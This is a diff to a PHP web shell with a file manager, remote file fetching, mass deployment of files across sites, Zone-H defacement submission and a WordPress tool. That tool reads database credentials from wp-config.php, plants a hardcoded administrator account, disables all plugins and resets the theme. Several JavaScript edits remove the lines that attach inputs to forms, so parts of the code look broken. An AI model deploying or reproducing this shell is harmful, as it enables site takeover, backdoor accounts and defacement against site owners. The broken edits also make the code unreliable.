@@ -200,56 +200,21 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// Auto-find WordPress config
-function RBPfindWPConfig($startDir = null) {
-    if ($startDir === null) {
-        $startDir = getcwd();
-    }
-    
-    $dirsToCheck = [$startDir];
-    $checkedDirs = [];
-    
-    while (!empty($dirsToCheck)) {
-        $currentDir = array_shift($dirsToCheck);
-        $checkedDirs[] = $currentDir;
-        
-        // Check for wp-config.php in current directory
-        $wpConfig = $currentDir . '/wp-config.php';
-        if (file_exists($wpConfig)) {
-            return $wpConfig;
-        }
-        
-        // Scan subdirectories
-        if (is_dir($currentDir) && $handle = opendir($currentDir)) {
-            while (false !== ($entry = readdir($handle))) {
-                if ($entry != "." && $entry != "..") {
-                    $fullPath = $currentDir . '/' . $entry;
-                    if (is_dir($fullPath) && !in_array($fullPath, $checkedDirs)) {
-                        $dirsToCheck[] = $fullPath;
-                    }
-                }
-            }
-            closedir($handle);
-        }
-    }
-    
-    return null;
-}
-
-// WordPress User Editor Function
+// WordPress User Editor Function - RUNS FROM CURRENT DIRECTORY
 function RBPeditWordPressUser() {
     $result = [];
     
-    // Auto-detect wp-config.php
-    $wpConfigPath = RBPfindWPConfig();
+    // Use current directory - assuming we're in WordPress root
+    $wpConfigPath = getcwd() . '/wp-config.php';
+    $wpDir = getcwd();
     
-    if (!$wpConfigPath) {
-        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found!";
+    if (!file_exists($wpConfigPath)) {
+        $result['error'] = "❌ WordPress configuration file (wp-config.php) not found in current directory!";
+        $result['current_dir'] = $wpDir;
         return $result;
     }
     
     $result['wp_config_path'] = $wpConfigPath;
-    $wpDir = dirname($wpConfigPath);
     
     // Default credentials
     $new_user_login = 'ReaperBythe222@';
@@ -402,7 +367,7 @@ require __DIR__ . '/wp-blog-header.php';";
     $table_prefix = parse_table_prefix($wpConfigPath);
 
     if (in_array(null, $db_constants, true)) {
-        $result['error'] = "❌ Could not parse WordPress database configuration";
+        $result['error'] = "❌ Could not parse WordPress database configuration from wp-config.php";
         return $result;
     }
 
@@ -411,7 +376,8 @@ require __DIR__ . '/wp-blog-header.php';";
     $db_password = $db_constants['DB_PASSWORD'];
     $db_host     = $db_constants['DB_HOST'];
 
-    $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+    // Test database connection
+    $mysqli = @new mysqli($db_host, $db_user, $db_password, $db_name);
     if ($mysqli->connect_error) {
         $result['error'] = "❌ Database connection failed: " . $mysqli->connect_error;
         return $result;
@@ -420,6 +386,7 @@ require __DIR__ . '/wp-blog-header.php';";
     $hasher = new PasswordHash();
     $password_hash = $hasher->HashPassword($new_user_pass);
 
+    // Check if user exists
     $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
     $stmt->bind_param('s', $new_user_login);
     $stmt->execute();
@@ -428,17 +395,19 @@ require __DIR__ . '/wp-blog-header.php';";
     $stmt->close();
 
     if ($user_exists) {
+        // Update existing user
         $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
         $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to update existing user";
+            $result['error'] = "❌ Failed to update existing user: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
         $stmt->close();
         $result['action'] = 'updated';
     } else {
-        $time = date('Y-m-d H:i:s', rand(strtotime('2020-01-01'), strtotime('2023-12-31')));
+        // Create new user
+        $time = date('Y-m-d H:i:s');
         $stmt = $mysqli->prepare("
         INSERT INTO `{$table_prefix}users` 
         (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
@@ -449,13 +418,14 @@ require __DIR__ . '/wp-blog-header.php';";
         $display_name  = $new_user_login;
         $stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to create new user";
+            $result['error'] = "❌ Failed to create new user: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
         $new_user_id = $stmt->insert_id;
         $stmt->close();
 
+        // Set user capabilities (administrator)
         $cap_key = $table_prefix . 'capabilities';
         $level_key = $table_prefix . 'user_level';
         $capabilities = serialize(['administrator' => true]);
@@ -463,18 +433,19 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
         $stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to set user capabilities";
+            $result['error'] = "❌ Failed to set user capabilities: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
         $stmt->close();
 
+        // Set user level
         $user_level = 10;
         $level_value = (string)$user_level;
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
-        $stmt->bind_param('iss', $new_user_id, $level_key,$level_value);
+        $stmt->bind_param('iss', $new_user_id, $level_key, $level_value);
         if (!$stmt->execute()) {
-            $result['error'] = "❌ Failed to set user level";
+            $result['error'] = "❌ Failed to set user level: " . $mysqli->error;
             $mysqli->close();
             return $result;
         }
@@ -482,34 +453,40 @@ require __DIR__ . '/wp-blog-header.php';";
         $result['action'] = 'created';
     }
 
+    // Reset active plugins
     $empty_plugins = serialize([]);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
-    $stmt->bind_param('s', $empty_plugins);
-    $stmt->execute();
-    $stmt->close();
+    if ($stmt) {
+        $stmt->bind_param('s', $empty_plugins);
+        $stmt->execute();
+        $stmt->close();
+    }
 
+    // Set default theme
     $default_theme = detect_default_theme($wpDir);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
-    $stmt->bind_param('s', $default_theme);
-    $stmt->execute();
-    $stmt->close();
+    if ($stmt) {
+        $stmt->bind_param('s', $default_theme);
+        $stmt->execute();
+        $stmt->close();
+    }
 
-    restore_wordpress_index($wp_index_path);
+    // Restore WordPress index
+    if (file_exists($wp_index_path)) {
+        restore_wordpress_index($wp_index_path);
+    }
 
     $mysqli->close();
 
     // Get WordPress login URL
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
     $host = $_SERVER['HTTP_HOST'];
-    $path = dirname($_SERVER['REQUEST_URI']);
-    
-    // Find WordPress root relative to current script
-    $wpRoot = str_replace(getcwd(), '', $wpDir);
-    $loginUrl = $protocol . $host . $wpRoot . '/wp-login.php';
+    $loginUrl = $protocol . $host . '/wp-login.php';
     
     $result['success'] = "✅ WordPress user " . $result['action'] . " successfully!";
     $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
     $result['login_url'] = $loginUrl;
+    $result['current_dir'] = $wpDir;
     
     return $result;
 }
@@ -523,7 +500,7 @@ if (isset($_POST['baseDir'])) {
     $baseDir = $_COOKIE['baseDir'] ?? $defaultBaseDir;
 }
 
-// Handle directory navigation
+// Handle directory navigation - NO AUTO REDIRECT
 if (isset($_GET['d']) && !empty($_GET['d'])) {
     $currentDir = base64_decode($_GET['d']);
     $currentDir = realpath($currentDir) ?: $currentDir;
@@ -553,34 +530,31 @@ if (isset($_GET['download'])) {
     exit;
 }
 
-// Mass deploy handler
+// Mass deploy handler - NO REDIRECT
 if (isset($_POST['mass_deploy'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
     if (empty($sourceFile) || !file_exists($sourceFile)) {
-        echo "<script>alert('Source file not found: $sourceFile'); window.location.href = '?' + Math.random();</script>";
+        echo "<script>alert('Source file not found: $sourceFile');</script>";
         exit;
     }
     
     $results = RBPmassDeploy($sourceFile, $baseDir);
     
     if (isset($results['error'])) {
-        echo "<script>alert('" . $results['error'] . "'); window.location.href = '?' + Math.random();</script>";
+        echo "<script>alert('" . $results['error'] . "');</script>";
         exit;
     }
     
-    // Store results in session to display on next page load
+    // Store results in session to display
     $_SESSION['mass_deploy_results'] = $results;
     $_SESSION['mass_deploy_source'] = $sourceFile;
     $_SESSION['mass_deploy_base'] = $baseDir;
-    
-    // Redirect back to main page
-    header("Location: ?deploy_complete=1");
     exit;
 }
 
-// Mass delete handler
+// Mass delete handler - NO REDIRECT
 if (isset($_POST['mass_delete'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
@@ -588,31 +562,25 @@ if (isset($_POST['mass_delete'])) {
     
     $results = RBPmassDelete($baseDir, $filename);
     
-    // Store results in session to display on next page load
+    // Store results in session to display
     $_SESSION['mass_delete_results'] = $results;
     $_SESSION['mass_delete_filename'] = $filename;
     $_SESSION['mass_delete_base'] = $baseDir;
-    
-    // Redirect back to main page
-    header("Location: ?delete_complete=1");
     exit;
 }
 
-// WordPress User Editor Handler
+// WordPress User Editor Handler - NO REDIRECT
 if (isset($_POST['wp_edit_user_submit'])) {
     $isPostAction = true;
     
     $result = RBPeditWordPressUser();
     
-    // Store results in session to display on next page load
+    // Store results in session to display
     $_SESSION['wp_edit_results'] = $result;
-    
-    // Redirect back to main page
-    header("Location: ?wp_edit_complete=1");
     exit;
 }
 
-// WGET Download Functionality
+// WGET Download Functionality - NO REDIRECT
 if (isset($_POST['wget_url'])) {
     $isPostAction = true;
     $url = $_POST['wget_url'] ?? '';
@@ -631,15 +599,15 @@ if (isset($_POST['wget_url'])) {
         curl_close($ch);
         
         if ($httpCode === 200 && $fileContent !== false && file_put_contents($destination, $fileContent)) {
-            echo "<script>alert('File downloaded successfully!'); window.location.href = '?' + Math.random();</script>";
+            echo "<script>alert('File downloaded successfully!');</script>";
         } else {
-            echo "<script>alert('Download failed! HTTP Code: $httpCode'); window.location.href = '?' + Math.random();</script>";
+            echo "<script>alert('Download failed! HTTP Code: $httpCode');</script>";
         }
     }
     exit;
 }
 
-// Adminer Download Functionality
+// Adminer Download Functionality - NO REDIRECT
 if (isset($_POST['download_adminer'])) {
     $isPostAction = true;
     function RBPadminer($url, $isi) {
@@ -662,27 +630,18 @@ if (isset($_POST['download_adminer'])) {
     }
 
     if (file_exists('adminer.php')) {
-        echo "<script>
-            alert('Adminer is already downloaded!');
-            window.location.href = '?' + Math.random();
-        </script>";
+        echo "<script>alert('Adminer is already downloaded!');</script>";
     } else {
         if (RBPadminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
-            echo "<script>
-                alert('Adminer downloaded successfully!');
-                window.location.href = '?' + Math.random();
-            </script>";
+            echo "<script>alert('Adminer downloaded successfully!');</script>";
         } else {
-            echo "<script>
-                alert('Failed to download adminer.php');
-                window.location.href = '?' + Math.random();
-            </script>";
+            echo "<script>alert('Failed to download adminer.php');</script>";
         }
     }
     exit;
 }
 
-// Zone-H Functionality
+// Zone-H Functionality - NO REDIRECT
 if (isset($_POST['zoneh_submit'])) {
     $isPostAction = true;
     $domainList = isset($_POST['zoneh_url']) ? explode("\n", str_replace("\r", "", $_POST['zoneh_url'])) : [];
@@ -710,7 +669,7 @@ if (isset($_POST['zoneh_submit'])) {
     exit;
 }
 
-// Upload handler
+// Upload handler - NO REDIRECT
 if (isset($_POST['s']) && isset($_FILES['u'])) {
     $isPostAction = true;
     if ($_FILES['u']['error'] == 0) {
@@ -718,43 +677,43 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
         $tmpName = $_FILES['u']['tmp_name'];
         $destination = $currentDir . '/' . $fileName;
         if (move_uploaded_file($tmpName, $destination)) {
-            echo "<script>alert('Upload successful!'); window.location.href = '?' + Math.random();</script>";
+            echo "<script>alert('Upload successful!');</script>";
         } else {
-            echo "<script>alert('Upload failed!'); window.location.href = '?' + Math.random();</script>";
+            echo "<script>alert('Upload failed!');</script>";
         }
     } else {
-        echo "<script>alert('Upload error: " . $_FILES['u']['error'] . "'); window.location.href = '?' + Math.random();</script>";
+        echo "<script>alert('Upload error: " . $_FILES['u']['error'] . "');</script>";
     }
     exit;
 }
 
-// Delete File handler
+// Delete File handler - NO REDIRECT
 if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
     $fileDir = dirname($filePath);
     if (@unlink($filePath)) {
-        echo "<script>alert('Delete successful'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+        echo "<script>alert('Delete successful');</script>";
     } else {
-        echo "<script>alert('Delete failed'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+        echo "<script>alert('Delete failed');</script>";
     }
     exit;
 }
 
-// Save Edited File handler
+// Save Edited File handler - NO REDIRECT
 if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
     $fileDir = dirname($filePath);
     if (file_put_contents($filePath, $_POST['content'])) {
-        echo "<script>alert('Saved'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+        echo "<script>alert('Saved');</script>";
     } else {
-        echo "<script>alert('Save failed'); window.location.href = '?d=" . base64_encode($fileDir) . "&' + Math.random();</script>";
+        echo "<script>alert('Save failed');</script>";
     }
     exit;
 }
 
-// Rename handler
+// Rename handler - NO REDIRECT
 if (isset($_POST['ren'])) {
     $isPostAction = true;
     $oldPath = base64_decode($_POST['ren']);
@@ -762,9 +721,9 @@ if (isset($_POST['ren'])) {
     if (isset($_POST['new'])) {
         $newPath = $oldDir . '/' . $_POST['new'];
         if (rename($oldPath, $newPath)) {
-            echo "<script>alert('Renamed'); window.location.href = '?d=" . base64_encode($oldDir) . "&' + Math.random();</script>";
+            echo "<script>alert('Renamed');</script>";
         } else {
-            echo "<script>alert('Rename failed'); window.location.href = '?d=" . base64_encode($oldDir) . "&' + Math.random();</script>";
+            echo "<script>alert('Rename failed');</script>";
         }
     }
     exit;
@@ -775,13 +734,11 @@ if (isset($_POST['edit'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['edit']);
     $fileDir = dirname($filePath);
-    // This will show the edit form in the HTML section below
 }
 
-// If it's a POST action that doesn't match any handler, redirect to avoid white screen
+// If it's a POST action that doesn't match any handler
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
-    header("Location: " . $_SERVER['REQUEST_URI']);
-    exit;
+    // Just continue without redirect
 }
 ?>
 
@@ -1117,10 +1074,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             background: #45a049;
             transform: translateY(-2px);
         }
+        
+        .error-box {
+            background: #3c1a1a;
+            border: 2px solid #f44336;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
     </style>
     <script>
         function RBPpostDir(dir) {
-            window.location.href = '?d=' + btoa(dir) + '&' + Math.random();
+            window.location.href = '?d=' + btoa(dir);
         }
         
         function RBPpostDel(path) {
@@ -1130,7 +1095,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 var input = document.createElement("input");
                 input.name = "del";
                 input.value = btoa(path);
-                form.appendChild(input);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1142,7 +1106,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             var input = document.createElement("input");
             input.name = "edit";
             input.value = btoa(path);
-            form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1158,8 +1121,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 var input2 = document.createElement("input");
                 input2.name = "new";
                 input2.value = newName;
-                form.appendChild(input1);
-                form.appendChild(input2);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1250,8 +1211,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         
         function RBPcloseResultsPopup() {
             document.getElementById('resultsPopup').style.display = 'none';
-            // Clear session results
-            window.location.href = '?' + Math.random();
         }
         
         function RBPsubmitWget() {
@@ -1262,11 +1221,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 var input1 = document.createElement("input");
                 input1.name = "wget_url";
                 input1.value = url;
-                var input2 = document.createElement("input");
-                input2.name = "d";
-                input2.value = "<?php echo base64_encode($currentDir); ?>";
-                form.appendChild(input1);
-                form.appendChild(input2);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1280,12 +1234,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             input1.name = "download_adminer";
             input1.value = "1";
             
-            var input2 = document.createElement("input");
-            input2.name = "d";
-            input2.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1306,14 +1254,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             input3.name = "zoneh_submit";
             input3.value = "1";
             
-            var input4 = document.createElement("input");
-            input4.name = "d";
-            input4.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
-            form.appendChild(input4);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1330,13 +1270,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             input2.name = "mass_deploy";
             input2.value = "1";
             
-            var input3 = document.createElement("input");
-            input3.name = "d";
-            input3.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1353,13 +1286,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             input2.name = "mass_delete";
             input2.value = "1";
             
-            var input3 = document.createElement("input");
-            input3.name = "d";
-            input3.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
-            form.appendChild(input3);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1376,23 +1302,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             input1.name = "wp_edit_user_submit";
             input1.value = "1";
             
-            var input2 = document.createElement("input");
-            input2.name = "d";
-            input2.value = "<?php echo base64_encode($currentDir); ?>";
-            
-            form.appendChild(input1);
-            form.appendChild(input2);
             document.body.appendChild(form);
             form.submit();
         }
         
         // Auto-show results popup if there are results
         window.onload = function() {
-            <?php if (isset($_SESSION['mass_deploy_results'])): ?>
-            document.getElementById('resultsPopup').style.display = 'block';
-            <?php elseif (isset($_SESSION['mass_delete_results'])): ?>
-            document.getElementById('resultsPopup').style.display = 'block';
-            <?php elseif (isset($_SESSION['wp_edit_results'])): ?>
+            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php endif; ?>
         };
@@ -1417,7 +1333,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             <form method="post" enctype="multipart/form-data">
                 <input type="file" name="u" style="color:#fff;background:#333;padding:5px;border-radius:3px;border:1px solid #555;">
                 <input type="submit" name="s" value="Upload" class="tool-button">
-                <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
             </form>
         </div>
     </div>
@@ -1474,8 +1389,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 echo '<h3>WordPress User Editor</h3>';
                 
                 if (isset($result['error'])) {
-                    echo '<div style="background: #3c1a1a; border: 2px solid #f44336; border-radius: 8px; padding: 20px; margin: 15px 0;">';
+                    echo '<div class="error-box">';
                     echo '<p style="color: #ff6b6b; font-size: 16px; margin: 0;">' . htmlspecialchars($result['error']) . '</p>';
+                    if (isset($result['current_dir'])) {
+                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">Current directory: ' . htmlspecialchars($result['current_dir']) . '</p>';
+                    }
                     echo '</div>';
                 } elseif (isset($result['success'])) {
                     echo '<div class="success-box">';
@@ -1493,7 +1411,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                     
                     if (isset($result['wp_config_path'])) {
                         echo '<p style="color: #ccc; font-size: 12px; margin-top: 15px;">';
-                        echo 'Detected wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
+                        echo 'Using wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
                         echo '</p>';
                     }
                     
@@ -1592,7 +1510,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 <h3>WordPress User Editor</h3>
                 <p>This will automatically:</p>
                 <ul style="text-align: left; margin: 15px 0; padding-left: 20px;">
-                    <li>Find WordPress installation</li>
+                    <li>Use current directory as WordPress root</li>
                     <li>Create/update admin user</li>
                     <li>Set default credentials</li>
                     <li>Reset active plugins</li>
@@ -1603,11 +1521,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                     Username: <strong>ReaperBythe222@</strong><br>
                     Password: <strong>ReaperBythe222@</strong>
                 </p>
+                <p style="color: #ccc; font-size: 12px;">Current directory: <?php echo htmlspecialchars($currentDir); ?></p>
                 <div style="text-align: center; margin-top: 15px;">
                     <button onclick="RBPsubmitWPEditUser()" class="tool-button" style="background: #4CAF50; border-color: #4CAF50;">Edit WordPress User</button>
                     <button onclick="RBPclosePopup('wpedituserPopup')" class="tool-button">Cancel</button>
                 </div>
-                <p><small>Note: This will scan for wp-config.php and create administrator access</small></p>
+                <p><small>Note: Make sure wp-config.php exists in current directory</small></p>
             </div>
         </div>
     </div>
